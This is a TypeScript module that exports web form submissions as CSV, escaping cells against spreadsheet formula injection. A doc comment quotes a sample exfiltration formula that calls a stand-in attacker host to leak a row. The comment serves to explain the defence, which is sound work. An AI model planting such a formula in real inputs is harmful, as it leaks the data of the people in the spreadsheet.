/**
 * Submissions → CSV.
 *
 * Export is the *primary* action on the submissions screen, not a hidden menu
 * item, because pulling leads into a spreadsheet or a CRM is what merchants
 * actually do with them. It is worth getting right rather than treating as a
 * footnote.
 *
 * Pure so the escaping rules — which are the entire risk surface here — can be
 * tested without a database.
 */

export interface ExportableSubmission {
  createdAt: string;
  answers: { label: string; value: string }[];
}

/**
 * Escapes one CSV cell.
 *
 * Two separate concerns, and conflating them is the usual bug:
 *
 *  1. **CSV structure** — quotes, commas and newlines must be quoted and
 *     doubled, or one merchant's message containing a comma shifts every
 *     column after it.
 *
 *  2. **Formula injection** — a cell beginning `=`, `+`, `-`, `@`, or a tab or
 *     carriage return, is executed as a formula when the file is opened in
 *     Excel, Google Sheets or LibreOffice. `=HYPERLINK("http://evil.test?"&A1)`
 *     typed into a public restaurant contact form becomes a live link that
 *     exfiltrates the row the moment the owner opens their leads. Prefixing
 *     with an apostrophe is the standard mitigation and is invisible in the
 *     spreadsheet.
 *
 * The second is why this function exists at all rather than a `join(",")`: the
 * data in these cells was typed by strangers on the internet.
 */
export function csvCell(value: string): string {
  const dangerous = /^[=+\-@\t\r]/.test(value);
  const escaped = (dangerous ? `'${value}` : value).replace(/"/g, '""');
  return `"${escaped}"`;
}

/**
 * Builds a CSV whose columns are the union of every question asked.
 *
 * Union rather than the current form's fields, because a submission from before
 * the form was rewritten carries questions the form no longer has — and those
 * are exactly the historical leads a merchant is most likely to be exporting.
 * Dropping them would silently lose data that is sitting right there in the row.
 * Order follows first appearance, newest submission first, so today's shape
 * leads.
 */
export function submissionsToCsv(submissions: ExportableSubmission[]): string {
  const columns: string[] = [];
  for (const submission of submissions) {
    for (const answer of submission.answers) {
      if (!columns.includes(answer.label)) columns.push(answer.label);
    }
  }

  const header = ["Received", ...columns].map(csvCell).join(",");

  const rows = submissions.map((submission) => {
    const byLabel = new Map(submission.answers.map((a) => [a.label, a.value]));
    return [submission.createdAt, ...columns.map((column) => byLabel.get(column) ?? "")]
      .map(csvCell)
      .join(",");
  });

  // CRLF and a UTF-8 BOM: without the BOM, Excel on Windows renders "café" as
  // "cafÃ©", which is the single most common complaint about exported CSVs.
  return `﻿${[header, ...rows].join("\r\n")}`;
}

/** A filename that sorts chronologically and survives every filesystem. */
export function csvFilename(formName: string): string {
  const safe = formName
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 40);
  const date = new Date().toISOString().slice(0, 10);
  return `${safe || "form"}-responses-${date}.csv`;
}
